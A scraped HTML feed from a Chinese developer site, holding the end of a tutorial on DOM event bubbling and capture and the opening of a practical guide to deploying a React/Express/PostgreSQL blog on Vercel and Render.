element.<span class="hljs-title function_">removeEventListener</span>(<span class="hljs-string">'click'</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'无法移除'</span>);
}); <span class="hljs-comment">// 不生效</span>
</code></pre>
<h2 data-id="heading-33">13. 现代框架中的事件处理</h2>
<h3 data-id="heading-34">React</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">MyComponent</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleClick</span> = (<span class="hljs-params">event</span>) =&gt; {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'React 事件是合成事件'</span>);
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'事件目标:'</span>, event.<span class="hljs-property">target</span>);
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'冒泡行为:'</span>, event.<span class="hljs-property">nativeEvent</span>.<span class="hljs-property">bubbles</span>);
  };

  <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleSubmit</span> = (<span class="hljs-params">event</span>) =&gt; {
    event.<span class="hljs-title function_">preventDefault</span>();  <span class="hljs-comment">// 阻止表单提交</span>
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'表单提交被阻止'</span>);
  };

  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">{handleClick}</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">onSubmit</span>=<span class="hljs-string">{handleSubmit}</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"submit"</span>&gt;</span>提交<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  );
}
</code></pre>
<h3 data-id="heading-35">Vue</h3>
<pre><code class="hljs language-js" lang="js">&lt;template&gt;
  <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">"handleClick"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">form</span> @<span class="hljs-attr">submit.prevent</span>=<span class="hljs-string">"handleSubmit"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"submit"</span>&gt;</span>提交<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
&lt;/template&gt;

<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> {
  <span class="hljs-attr">methods</span>: {
    <span class="hljs-title function_">handleClick</span>(<span class="hljs-params">event</span>) {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Vue 事件处理'</span>);
      event.<span class="hljs-title function_">stopPropagation</span>(); <span class="hljs-comment">// 原生方法</span>
    },
    <span class="hljs-title function_">handleSubmit</span>(<span class="hljs-params"/>) {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'.prevent 修饰符自动阻止默认行为'</span>);
    }
  }
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span>
</code></pre>
<h2 data-id="heading-36">14. 总结</h2>
<h3 data-id="heading-37">关键点总结</h3>






























<table><thead><tr><th>特性</th><th>事件捕获</th><th>事件冒泡</th></tr></thead><tbody><tr><td>传播方向</td><td>上 → 下</td><td>下 → 上</td></tr><tr><td>默认启用</td><td>❌ 需显式设置</td><td>✅ 默认</td></tr><tr><td>使用场景</td><td>少，特殊需求</td><td>多，事件委托</td></tr><tr><td>添加方法</td><td><code>addEventListener(..., true)</code></td><td><code>addEventListener(..., false)</code></td></tr></tbody></table>
<h3 data-id="heading-38">最佳实践</h3>
<ol>
<li><strong>使用事件委托</strong>：减少监听器数量，提高性能</li>
<li><strong>理解事件流</strong>：知道事件如何传播</li>
<li><strong>合理使用停止传播</strong>：但不要滥用</li>
<li><strong>使用被动监听器</strong>：提高滚动性能</li>
<li><strong>注意内存泄漏</strong>：及时移除不需要的监听器</li>
<li><strong>利用框架特性</strong>：React/Vue 等框架有优化</li>
</ol>
<h3 data-id="heading-39">记忆口诀</h3>
<pre><code class="hljs language-html" lang="html">事件三阶段，捕获、目标 和 冒泡

从上往下 叫捕获，从下往上 叫冒泡

目标在中间，两阶段都要到

委托用冒泡，性能高可靠
</code></pre>
<p>通过理解事件冒泡和捕获，你可以更有效地处理 DOM 事件，优化性能，并写出更优雅的事件处理代码。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Vercel + Render 全栈博客部署实战指南]]></title>    <link>https://juejin.cn/post/7581251003330445338</link>    <guid>https://juejin.cn/post/7581251003330445338</guid>    <pubDate>2025-12-08T12:34:59.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581251003330445338" data-draft-id="7581297888808681522" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Vercel + Render 全栈博客部署实战指南"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2025-12-08T12:34:59.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="一抹残云"/> <meta itemprop="url" content="https://juejin.cn/user/1574156384092951"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Vercel + Render 全栈博客部署实战指南
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1574156384092951/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    一抹残云
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-08T12:34:59.000Z" title="Mon Dec 08 2025 12:34:59 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    3
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读14分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>从零到部署：使用 Vercel 部署前端、Render 部署后端的完整实操手册 ，其中用到的实例皆是本人个人项目<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fxiaozhen123321%2Fblog" target="_blank" title="https://github.com/xiaozhen123321/blog" ref="nofollow noopener noreferrer">实战demo</a>，部署后<a href="https://link.juejin.cn?target=https%3A%2F%2Fvercel.com%2Fxiaozhen123321s-projects%2Fblog-fronted" target="_blank" title="https://vercel.com/xiaozhen123321s-projects/blog-fronted" ref="nofollow noopener noreferrer">前端地址</a></p>
</blockquote>
<hr/>
<h2 data-id="heading-0">📋 目录</h2>
<ol>
<li><a href="#1-%E9%83%A8%E7%BD%B2%E6%9E%B6%E6%9E%84%E6%A6%82%E8%A7%88" title="#1-%E9%83%A8%E7%BD%B2%E6%9E%B6%E6%9E%84%E6%A6%82%E8%A7%88">部署架构概览</a></li>
<li><a href="#2-%E5%89%8D%E7%BD%AE%E5%87%86%E5%A4%87" title="#2-%E5%89%8D%E7%BD%AE%E5%87%86%E5%A4%87">前置准备</a></li>
<li><a href="#3-%E7%AC%AC%E4%B8%80%E6%AD%A5%E9%83%A8%E7%BD%B2%E5%90%8E%E7%AB%AF%E5%88%B0-render" title="#3-%E7%AC%AC%E4%B8%80%E6%AD%A5%E9%83%A8%E7%BD%B2%E5%90%8E%E7%AB%AF%E5%88%B0-render">第一步：部署后端到 Render</a></li>
<li><a href="#4-%E7%AC%AC%E4%BA%8C%E6%AD%A5%E5%88%9D%E5%A7%8B%E5%8C%96%E6%95%B0%E6%8D%AE%E5%BA%93" title="#4-%E7%AC%AC%E4%BA%8C%E6%AD%A5%E5%88%9D%E5%A7%8B%E5%8C%96%E6%95%B0%E6%8D%AE%E5%BA%93">第二步：初始化数据库</a></li>
<li><a href="#5-%E7%AC%AC%E4%B8%89%E6%AD%A5%E9%83%A8%E7%BD%B2%E5%89%8D%E7%AB%AF%E5%88%B0-vercel" title="#5-%E7%AC%AC%E4%B8%89%E6%AD%A5%E9%83%A8%E7%BD%B2%E5%89%8D%E7%AB%AF%E5%88%B0-vercel">第三步：部署前端到 Vercel</a></li>
<li><a href="#6-%E7%AC%AC%E5%9B%9B%E6%AD%A5%E9%83%A8%E7%BD%B2%E5%90%8E%E5%8F%B0%E7%AE%A1%E7%90%86%E5%88%B0-vercel" title="#6-%E7%AC%AC%E5%9B%9B%E6%AD%A5%E9%83%A8%E7%BD%B2%E5%90%8E%E5%8F%B0%E7%AE%A1%E7%90%86%E5%88%B0-vercel">第四步：部署后台管理到 Vercel</a></li>
<li><a href="#7-%E7%AC%AC%E4%BA%94%E6%AD%A5%E8%BF%9E%E6%8E%A5%E5%89%8D%E5%90%8E%E7%AB%AF" title="#7-%E7%AC%AC%E4%BA%94%E6%AD%A5%E8%BF%9E%E6%8E%A5%E5%89%8D%E5%90%8E%E7%AB%AF">第五步：连接前后端</a></li>
<li><a href="#8-%E7%AC%AC%E5%85%AD%E6%AD%A5%E9%AA%8C%E8%AF%81%E9%83%A8%E7%BD%B2" title="#8-%E7%AC%AC%E5%85%AD%E6%AD%A5%E9%AA%8C%E8%AF%81%E9%83%A8%E7%BD%B2">第六步：验证部署</a></li>
<li><a href="#9-monorepo-%E7%89%B9%E6%AE%8A%E9%85%8D%E7%BD%AE%E8%AF%B4%E6%98%8E" title="#9-monorepo-%E7%89%B9%E6%AE%8A%E9%85%8D%E7%BD%AE%E8%AF%B4%E6%98%8E">Monorepo 特殊配置说明</a></li>
<li><a href="#10-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%AE%8C%E6%95%B4%E6%B8%85%E5%8D%95" title="#10-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%AE%8C%E6%95%B4%E6%B8%85%E5%8D%95">环境变量完整清单</a></li>
<li><a href="#11-%E5%85%8D%E8%B4%B9%E9%A2%9D%E5%BA%A6%E8%AF%B4%E6%98%8E" title="#11-%E5%85%8D%E8%B4%B9%E9%A2%9D%E5%BA%A6%E8%AF%B4%E6%98%8E">免费额度说明</a></li>
<li><a href="#12-%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98%E6%8E%92%E6%9F%A5" title="#12-%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98%E6%8E%92%E6%9F%A5">常见问题排查</a></li>
<li><a href="#13-%E4%BC%98%E5%8C%96%E5%BB%BA%E8%AE%AE" title="#13-%E4%BC%98%E5%8C%96%E5%BB%BA%E8%AE%AE">优化建议</a></li>
<li><a href="#14-%E6%8C%81%E7%BB%AD%E9%83%A8%E7%BD%B2cicd" title="#14-%E6%8C%81%E7%BB%AD%E9%83%A8%E7%BD%B2cicd">持续部署（CI/CD）</a></li>
</ol>
<hr/>
<h2 data-id="heading-1">1. 部署架构概览</h2>
<h3 data-id="heading-2">部署架构图</h3>
<pre><code class="hljs language-scss" lang="scss">┌─────────────────────────────────────────────────────────────┐
│                         用户访问                              │
└──────────────────┬──────────────────┬───────────────────────┘
                   │                  │
         ┌─────────▼──────────┐  ┌───▼──────────────┐
         │   Vercel (前端)     │  │  Vercel (后台)    │
         │  blog-frontend     │  │   blog-admin     │
         │  静态资源 + SPA     │  │   管理界面        │
         └─────────┬──────────┘  └───┬──────────────┘
                   │                  │
                   │  API 请求 (/api) │
                   │                  │
         ┌─────────▼──────────────────▼──────────────┐
         │          Render (后端)                     │
         │         blog-server                       │
         │     Node<span class="hljs-selector-class">.js</span> + Express                     │
         │    (https://blog-<span class="hljs-number">2</span>eqo.onrender.com)      │
         └─────────┬─────────────────────────────────┘
                   │
                   │ PostgreSQL
                   │
         ┌─────────▼─────────────────────────────────┐
         │      Render PostgreSQL                    │
         │         blog-postgres                     │
         │      Database: blog_system                │
         └───────────────────────────────────────────┘
</code></pre>
<h3 data-id="heading-3">技术栈</h3>



































<table><thead><tr><th>组件</th><th>平台</th><th>技术栈</th><th>费用</th></tr></thead><tbody><tr><td><strong>前端</strong></td><td>Vercel</td><td>React + Rsbuild + Ant Design</td><td>免费</td></tr><tr><td><strong>后台管理</strong></td><td>Vercel</td><td>React + Rsbuild + Ant Design + Draft.js</td><td>免费</td></tr><tr><td><strong>后端 API</strong></td><td>Render</td><td>Node.js + Express + TypeScript</td><td>免费</td></tr><tr><td><strong>数据库</strong></td><td>Render</td><td>PostgreSQL 16</td><td>免费</td></tr></tbody></table>
<h3 data-id="heading-4">部署顺序</h3>
<p>⚠️ <strong>重要</strong>：必须按以下顺序部署，因为前端需要后端 API 的 URL：</p>
<ol>
<li><strong>后端</strong> → Render (获取 API URL)</li>
<li><strong>数据库初始化</strong> → Render Shell</li>
<li><strong>前端</strong> → Vercel (配置 API 代理)</li>
<li><strong>后台</strong> → Vercel (配置 API 代理)</li>
<li><strong>连接测试</strong> → 更新 CORS 配置</li>
</ol>
<hr/>
<h2 data-id="heading-5">2. 前置准备</h2>
<h3 data-id="heading-6">2.1 GitHub 仓库准备</h3>
<p>确保你的项目代码已推送到 GitHub：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">cd</span> /path/to/blog
git status
git add .
git commit -m <span class="hljs-string">"feat: prepare for deployment"</span>
git push origin main
</code></pre>
<h3 data-id="heading-7">2.2 账号注册</h3>
<p><strong>Render 注册</strong>：</p>
<ol>
<li>访问 <a href="https://link.juejin.cn?target=https%3A%2F%2Frender.com" target="_blank" title="https://render.com" ref="nofollow noopener noreferrer">render.com</a></li>
<li>点击 "Get Started" → "Sign Up with GitHub"</li>
<li>授权 Render 访问你的 GitHub 仓库</li>
<li>✅ 无需信用卡，完全免费</li>
</ol>
<p><strong>Vercel 注册</strong>：</p>
<ol>
<li>访问 <a href="https://link.juejin.cn?target=https%3A%2F%2Fvercel.com" target="_blank" title="https://vercel.com" ref="nofollow noopener noreferrer">vercel.com</a></li>
<li>点击 "Sign Up" → "Continue with GitHub"</li>
<li>授权 Vercel 访问你的 GitHub 仓库</li>
<li>✅ 无需信用卡，完全免费</li>
</ol>
<h3 data-id="heading-8">2.3 环境检查</h3>
<p>确认项目包含以下文件：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># Render 配置</span>
packages/blog-server/render.yaml              ✅
packages/blog-server/.env.render.example      ✅

<span class="hljs-comment"># Vercel 配置</span>
packages/blog-frontend/vercel.json            ✅
packages/blog-admin/vercel.json               ✅

<span class="hljs-comment"># 数据库初始化</span>
packages/blog-server/database/init.sql        ✅
packages/blog-server/scripts/init-database.ts ✅
</code></pre>
<hr/>
<h2 data-id="heading-9">3. 第一步：部署后端到 Render</h2>
<h3 data-id="heading-10">3.1 创建 PostgreSQL 数据库</h3>
<ol>
<li>
<p>登录 <a href="https://link.juejin.cn?target=https%3A%2F%2Fdashboard.render.com%2F" target="_blank" title="https://dashboard.render.com/" ref="nofollow noopener noreferrer">Render Dashboard</a></p>
</li>
<li>
<p>点击右上角 <strong>"New +"</strong> → 选择 <strong>"PostgreSQL"</strong></p>
</li>
<li>
<p>填写数据库配置：</p>

































<table><thead><tr><th>字段</th><th>值</th></tr></thead><tbody><tr><td><strong>Name</strong></td><td><code>blog-postgres</code></td></tr><tr><td><strong>Database</strong></td><td><code>blog_system</code></td></tr><tr><td><strong>User</strong></td><td><code>blog_user</code>（自动生成，可修改）</td></tr><tr><td><strong>Region</strong></td><td>选择 <strong>Singapore</strong>（离中国最近）</td></tr><tr><td><strong>PostgreSQL Version</strong></td><td>16（默认）</td></tr><tr><td><strong>Plan</strong></td><td><strong>Free</strong></td></tr></tbody></table>
</li>
<li>
<p>点击 <strong>"Create Database"</strong></p>
</li>
<li>
<p>等待约 1-2 分钟，状态变为 <strong>"Available"</strong></p>
</li>
<li>
<p><strong>保存连接信息</strong>（稍后需要）：</p>
<ul>
<li>进入数据库 → "Info" 标签</li>
<li>记录：
<ul>
<li><strong>Hostname</strong>（例如：<code>dpg-xxxx-a.singapore-postgres.render.com</code>）</li>
<li><strong>Port</strong>（通常是 <code>5432</code>）</li>
<li><strong>Database</strong>（<code>blog_system</code>）</li>
<li><strong>Username</strong>（<code>blog_user</code>）</li>
<li><strong>Password</strong>（自动生成的长密码）</li>
</ul>
</li>
</ul>
</li>
</ol>
<h3 data-id="heading-11">3.2 创建 Web Service（后端 API）</h3>
<ol>
<li>
<p>在 Render Dashboard，点击 <strong>"New +"</strong> → <strong>"Web Service"</strong></p>
</li>
<li>
<p>点击 <strong>"Build and deploy from a Git repository"</strong> → <strong>"Next"</strong></p>
</li>
<li>
<p>选择你的 GitHub 仓库 <code>blog</code>（如果没有显示，点击 "Configure account" 授权）</p>
</li>
<li>
<p>填写服务配置：</p>


















































<table><thead><tr><th>字段</th><th>值</th><th>说明</th></tr></thead><tbody><tr><td><strong>Name</strong></td><td><code>blog-server</code></td><td>服务名称</td></tr><tr><td><strong>Region</strong></td><td><strong>Singapore</strong></td><td>与数据库同区域</td></tr><tr><td><strong>Branch</strong></td><td><code>main</code></td><td>Git 分支</td></tr><tr><td><strong>Root Directory</strong></td><td><code>packages/blog-server</code></td><td>⚠️ <strong>重要</strong>：Monorepo 子目录</td></tr><tr><td><strong>Runtime</strong></td><td><strong>Node</strong></td><td>自动检测</td></tr><tr><td><strong>Build Command</strong></td><td><code>npm install &amp;&amp; npm run build</code></td><td>安装依赖并编译 TypeScript</td></tr><tr><td><strong>Start Command</strong></td><td><code>npm start</code></td><td>启动服务</td></tr><tr><td><strong>Plan</strong></td><td><strong>Free</strong></td><td>免费计划</td></tr></tbody></table>
</li>
<li>
<p>点击 <strong>"Advanced"</strong> 展开高级选项（暂不配置，稍后添加环境变量）</p>
</li>
<li>
<p>点击 <strong>"Create Web Service"</strong></p>
</li>
</ol>
<p>⏳ <strong>构建过程</strong>：约 3-5 分钟，在 "Logs" 标签查看进度</p>
<h3 data-id="heading-12">3.3 配置环境变量</h3>
<p>构建完成后（状态显示 "Live" 或 "Deploy failed"，先别管），配置环境变量：</p>
<ol>
<li>
<p>在 Web Service 页面，点击 <strong>"Environment"</strong> 标签</p>
</li>
<li>
<p>点击 <strong>"Add Environment Variable"</strong>，逐个添加以下变量：</p>
</li>
</ol>
<h4 data-id="heading-13">基础配置</h4>
<pre><code class="hljs language-bash" lang="bash">NODE_ENV=production
</code></pre>
<h4 data-id="heading-14">JWT 配置</h4>
<pre><code class="hljs language-bash" lang="bash">JWT_SECRET=51de2d30c5629597bf6f41dbcf9f41beb714bb31e91adb5899d25fce64202fd9
</code></pre>
<blockquote>
<p>💡 <strong>生产环境必须修改</strong>：使用以下命令生成新密钥：</p>
<pre><code class="hljs language-bash" lang="bash">node -e <span class="hljs-string">"console.log(require('crypto').randomBytes(32).toString('hex'))"</span>
</code></pre>
</blockquote>
<pre><code class="hljs language-bash" lang="bash">JWT_EXPIRES_IN=7d
</code></pre>
<h4 data-id="heading-15">CORS 配置（稍后更新）</h4>
<pre><code class="hljs language-bash" lang="bash">FRONTEND_URL=https://your-frontend.vercel.app
</code></pre>
<pre><code class="hljs language-bash" lang="bash">ADMIN_URL=https://your-admin.vercel.app
</code></pre>
<blockquote>
<p>⚠️ <strong>注意</strong>：这两个 URL 在部署 Vercel 后需要更新为实际 URL</p>
</blockquote>
<h4 data-id="heading-16">文件上传配置</h4>
<pre><code class="hljs language-bash" lang="bash">MAX_FILE_SIZE=5242880
</code></pre>
<pre><code class="hljs language-bash" lang="bash">ALLOWED_IMAGE_TYPES=image/jpeg,image/png,image/gif,image/webp
</code></pre>
<h4 data-id="heading-17">数据库配置（从步骤 3.1 复制）</h4>
<pre><code class="hljs language-bash" lang="bash">DB_HOST=&lt;从数据库 Info 复制 Hostname&gt;
</code></pre>
<pre><code class="hljs language-bash" lang="bash">DB_PORT=5432
</code></pre>
<pre><code class="hljs language-bash" lang="bash">DB_USER=&lt;从数据库 Info 复制 Username&gt;
</code></pre>
<pre><code class="hljs language-bash" lang="bash">DB_PASSWORD=&lt;从数据库 Info 复制 Password&gt;
</code></pre>
<pre><code class="hljs language-bash" lang="bash">DB_NAME=blog_system
</code></pre>
<ol start="3">
<li>
<p>点击 <strong>"Save Changes"</strong></p>
</li>
<li>
<p>Render 会自动触发重新部署（约 2 分钟）</p>
</li>
</ol>
<h3 data-id="heading-18">3.4 查看部署日志</h3>
<ol>
<li>在 "Logs" 标签，确认看到以下内容：</li>
</ol>
<pre><code class="hljs language-dart" lang="dart">🚀 Server <span class="hljs-keyword">is</span> running <span class="hljs-keyword">on</span> http:<span class="hljs-comment">//0.0.0.0:10000</span>
📝 Environment: production
🗄️  Database: blog_system<span class="hljs-meta">@dpg</span>-xxxx.singapore-postgres.render.com:<span class="hljs-number">5432</span>
</code></pre>
<ol start="2">
<li>如果看到错误，检查环境变量是否正确</li>
</ol>
<h3 data-id="heading-19">3.5 获取 API URL</h3>
<ol>
<li>
<p>在 Web Service 顶部，复制服务 URL：</p>
<pre><code class="hljs language-arduino" lang="arduino">https:<span class="hljs-comment">//blog-server-xxxx.onrender.com</span>
</code></pre>
</li>
<li>
<p><strong>保存这个 URL</strong>，稍后部署前端时需要</p>
</li>
<li>
<p>测试 API（可选）：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 健康检查</span>
curl https://blog-server-xxxx.onrender.com/api/health

<span class="hljs-comment"># 获取分类（应该返回空数组，因为数据库未初始化）</span>
curl https://blog-server-xxxx.onrender.com/api/categories
</code></pre>
</li>
</ol>
<hr/>
<h2 data-id="heading-20">4. 第二步：初始化数据库</h2>
<h3 data-id="heading-21">4.1 使用 Render Shell</h3>
<ol>
<li>
<p>在 Web Service 页面，点击 <strong>"Shell"</strong> 标签</p>
</li>
<li>
<p>点击 <strong>"Launch Shell"</strong> 按钮</p>
</li>
<li>
<p>等待 Shell 启动（约 10 秒）</p>
</li>
<li>
<p>在 Shell 中运行初始化脚本：</p>
<pre><code class="hljs language-bash" lang="bash">npm run db:init
</code></pre>
</li>
<li>
<p>成功后会看到：</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-string">🚀</span> <span class="hljs-string">Starting</span> <span class="hljs-string">database</span> <span class="hljs-string">initialization...</span>
<span class="hljs-string">✅</span> <span class="hljs-string">Connected</span> <span class="hljs-string">to</span> <span class="hljs-string">database</span>
<span class="hljs-string">✅</span> <span class="hljs-string">Tables</span> <span class="hljs-string">created</span> <span class="hljs-string">successfully</span>
<span class="hljs-string">✅</span> <span class="hljs-string">Seed</span> <span class="hljs-string">data</span> <span class="hljs-string">inserted</span> <span class="hljs-string">successfully</span>
<span class="hljs-string">✅</span> <span class="hljs-string">Admin</span> <span class="hljs-string">user</span> <span class="hljs-string">created</span> <span class="hljs-string">successfully</span>
<span class="hljs-string">🎉</span> <span class="hljs-string">Database</span> <span class="hljs-string">initialization</span> <span class="hljs-string">complete!</span>

<span class="hljs-string">📝</span> <span class="hljs-attr">Admin credentials:</span>
   <span class="hljs-attr">Username:</span> <span class="hljs-string">admin</span>
   <span class="hljs-attr">Password:</span> <span class="hljs-string">admin123</span>
   <span class="hljs-attr">Email:</span> <span class="hljs-string">admin@blog.com</span>
</code></pre>
</li>
</ol>
<h3 data-id="heading-22">4.2 验证数据</h3>
<p>在 Shell 中运行：</p>
